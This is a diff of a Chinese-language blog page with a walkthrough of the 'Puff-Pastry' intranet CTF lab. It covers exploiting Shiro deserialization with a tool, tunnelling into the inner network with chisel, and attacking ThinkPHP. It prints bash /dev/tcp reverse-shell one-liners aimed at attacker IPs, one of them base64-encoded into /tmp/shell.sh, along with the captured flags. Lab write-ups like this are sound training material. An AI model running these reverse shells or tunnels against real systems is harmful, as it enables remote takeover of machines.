@@ -6,18 +6,19 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="前言靶场地址：https:&#x2F;&#x2F;github.com&#x2F;CTF-Archives&#x2F;Puff-Pastry 网络拓扑图：   flag01 一个登陆页面，而且还有remember me字段，猜测是shiro反序列化，使用Shiro反序列化利用工具直接打  可以执行命令了cat &#x2F;flag.txt WSS-Studio&#123;Shiro-ad45528d-3341-41bc-8e68-7eb5b33e">
+    <meta name="description" content="前言靶场地址：https:&#x2F;&#x2F;github.com&#x2F;CTF-Archives&#x2F;Puff-Pastry 网络拓扑图：   Shiro flag01 一个登陆页面，而且还有remember me字段，猜测是shiro反序列化，使用Shiro反序列化利用工具直接打  可以执行命令了cat &#x2F;flag.txt WSS-Studio&#123;Shiro-ad45528d-3341-41bc-8e68-7e">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Puff-Pastry">
 <meta property="og:url" content="http://example.com/2025/06/06/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/index.html">
 <meta property="og:site_name" content="X1n">
-<meta property="og:description" content="前言靶场地址：https:&#x2F;&#x2F;github.com&#x2F;CTF-Archives&#x2F;Puff-Pastry 网络拓扑图：   flag01 一个登陆页面，而且还有remember me字段，猜测是shiro反序列化，使用Shiro反序列化利用工具直接打  可以执行命令了cat &#x2F;flag.txt WSS-Studio&#123;Shiro-ad45528d-3341-41bc-8e68-7eb5b33e">
+<meta property="og:description" content="前言靶场地址：https:&#x2F;&#x2F;github.com&#x2F;CTF-Archives&#x2F;Puff-Pastry 网络拓扑图：   Shiro flag01 一个登陆页面，而且还有remember me字段，猜测是shiro反序列化，使用Shiro反序列化利用工具直接打  可以执行命令了cat &#x2F;flag.txt WSS-Studio&#123;Shiro-ad45528d-3341-41bc-8e68-7e">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/2025/06/06/images/image-20250606175402519.png">
 <meta property="og:image" content="http://example.com/images/image-20250606175422906.png">
 <meta property="og:image" content="http://example.com/images/image-20250606175538502.png">
+<meta property="og:image" content="http://example.com/images/image-20250610164436181.png">
 <meta property="article:published_time" content="2025-06-06T09:52:15.000Z">
-<meta property="article:modified_time" content="2025-06-10T07:05:50.785Z">
+<meta property="article:modified_time" content="2025-06-10T10:32:09.910Z">
 <meta property="article:author" content="xin">
 <meta property="article:tag" content="内网靶场">
 <meta name="twitter:card" content="summary">
@@ -123,7 +124,7 @@
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag01"><span class="toc-number">2.</span> <span class="toc-text">flag01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag02"><span class="toc-number">3.</span> <span class="toc-text">flag02</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shiro-flag01"><span class="toc-number">2.</span> <span class="toc-text">Shiro flag01</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9thinkphp-shell"><span class="toc-number">2.1.</span> <span class="toc-text">反弹thinkphp shell</span></a></li></ol></li></ol>
       </div>
     
   </span>
@@ -172,12 +173,13 @@
 <p>网络拓扑图：</p>
 <img src="../images/image-20250606175402519.png" alt="image-20250606175402519" style="zoom:80%;" />
 
-<h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p><img src="/../images/image-20250606175422906.png" alt="image-20250606175422906"></p>
+<h2 id="Shiro-flag01"><a href="#Shiro-flag01" class="headerlink" title="Shiro flag01"></a>Shiro flag01</h2><p><img src="/../images/image-20250606175422906.png" alt="image-20250606175422906"></p>
 <p>一个登陆页面，而且还有remember me字段，猜测是shiro反序列化，使用<code>Shiro反序列化利用工具</code>直接打</p>
 <p><img src="/../images/image-20250606175538502.png" alt="image-20250606175538502"></p>
 <p>可以执行命令了<code>cat /flag.txt</code></p>
 <p><code>WSS-Studio&#123;Shiro-ad45528d-3341-41bc-8e68-7eb5b33e961c&#125;</code></p>
-<h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><p>先反弹shell吧</p>
+<p>##Thinkphp flag02</p>
+<p>先反弹shell吧</p>
 <p>反弹shell命令base64编码一下</p>
 <blockquote>
 <p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;8.133.198.27&#x2F;1122 0&gt;&amp;1*</p>
@@ -189,7 +191,20 @@
 <p><del>192.168.100.2 shiro反序列化 已经拿下</del></p>
 <p><em>192.168.100.3 thinkphp  未拿下</em></p>
 <p>这个机器是在内网，所以我们需要搭建代理隧道</p>
-<p>a</p>
+<p>###搭建代理</p>
+<p>使用chisel端口转发，先下载<code>chisel</code></p>
+<p>使用反向连接</p>
+<p>shiro机器上执行 <code>./chisel* client 192.168.69.44:2003 R:0.0.0.0:10001:192.168.100.3:80</code></p>
+<p>win11: <code>chisel.exe server -p 2003 --reverse</code></p>
+<p>使用thinkphp扫描工具</p>
+<p><img src="/../images/image-20250610164436181.png" alt="image-20250610164436181"></p>
+<p>拿flag</p>
+<p> <code>WSS-Studio&#123;ThinkPHP-84d786a4-b47c-4fcb-a377-be6241d5bf10&#125;</code></p>
+<p>发送DNS请求，发现该机器可以出网，那么就可以反弹shell</p>
+<h3 id="反弹thinkphp-shell"><a href="#反弹thinkphp-shell" class="headerlink" title="反弹thinkphp shell"></a>反弹thinkphp shell</h3><blockquote>
+<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.226.128&#x2F;1234 0&gt;&amp;1</p>
+</blockquote>
+<p><code>echo  YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIyNi4xMjgvMTIzNCAwPiYx | base64 -d &gt; /tmp/shell.sh</code></p>
 
   </div>
 </article>
@@ -221,7 +236,7 @@
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag01"><span class="toc-number">2.</span> <span class="toc-text">flag01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag02"><span class="toc-number">3.</span> <span class="toc-text">flag02</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shiro-flag01"><span class="toc-number">2.</span> <span class="toc-text">Shiro flag01</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9thinkphp-shell"><span class="toc-number">2.1.</span> <span class="toc-text">反弹thinkphp shell</span></a></li></ol></li></ol>
       </div>
     
 
